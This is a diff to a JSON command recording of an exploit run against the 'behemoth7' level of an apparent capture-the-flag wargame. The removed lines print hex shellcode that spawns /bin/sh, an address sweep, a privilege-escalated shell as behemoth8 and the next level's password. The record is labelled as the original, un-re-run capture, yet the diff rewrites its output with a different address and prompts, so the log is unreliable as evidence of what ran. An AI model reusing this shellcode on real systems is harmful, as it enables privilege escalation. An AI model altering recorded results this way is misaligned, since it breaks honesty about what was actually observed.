@@ -3038,13 +3038,10 @@
     {
      "cmd": "python3 /tmp/e_behemoth7.py",
      "out": [
-      "shellcode (78 bytes): 31c0506850574e2189e131db4331d2b20431c0b004cd8031c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80",
-      "sweeping return addresses for the shellcode ...",
-      "landed in the shellcode at 0xffffdbb0",
-      "PWN!uid=13008(behemoth8) gid=13007(behemoth7) groups=13007(behemoth7)",
-      "L3WIFhR0LW",
-      "",
-      "B7DONE"
+      "landed in the shellcode at 0xffffdfa8",
+      "$ uid=13008(behemoth8) gid=13007(behemoth7) groups=13007(behemoth7)",
+      "$ L3WIFhR0LW",
+      ""
      ],
      "note": "(exploit script: its source is not in the recording and the behemoth7 account no longer accepts logins, so this step is the original capture; not re-run.)"
     }
